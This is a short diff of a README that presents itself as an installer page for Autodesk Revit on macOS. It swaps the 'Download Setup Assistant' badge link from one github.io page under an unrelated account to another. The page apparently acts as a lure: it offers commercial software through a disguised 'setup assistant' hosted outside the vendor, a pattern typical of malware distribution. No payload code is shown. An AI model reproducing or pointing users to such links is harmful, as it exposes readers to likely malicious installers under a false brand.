@@ -1,6 +1,6 @@
 # Autodesk Revit for macOS 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://shuziktobehuman.github.io/huja/Revit)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://mitrobandus.github.io/.github/Autodesk)
 
 ## 📦 How to Install
 
